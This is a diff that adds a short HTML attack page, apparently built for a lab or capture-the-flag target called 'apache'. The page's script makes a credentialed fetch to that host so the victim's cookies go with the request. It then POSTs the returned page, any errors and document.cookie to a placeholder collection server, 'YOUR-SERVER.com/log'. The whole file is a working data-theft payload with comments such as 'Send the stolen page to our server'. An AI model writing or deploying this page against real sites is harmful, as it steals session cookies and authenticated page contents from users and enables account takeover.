@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Wait for page to load
+setTimeout(() => {
+    // Method 1: Try to fetch from apache WITH cookies
+    fetch('https://apache/', {
+        credentials: 'include'  // This sends cookies!
+    })
+    .then(response => response.text())
+    .then(html => {
+        // Send the stolen page to our server
+        fetch('https://YOUR-SERVER.com/log', {
+            method: 'POST',
+            body: 'GOT PAGE: ' + html
+        });
+    })
+    .catch(err => {
+        // Send any errors
+        fetch('https://YOUR-SERVER.com/log', {
+            method: 'POST', 
+            body: 'Error: ' + err.toString()
+        });
+    });
+
+    // Method 2: Try to read document.cookie (might not work but worth trying)
+    fetch('https://YOUR-SERVER.com/log', {
+        method: 'POST',
+        body: 'Cookies I can see: ' + document.cookie
+    });
+}, 1000);
+</script>
+</body>
+</html>
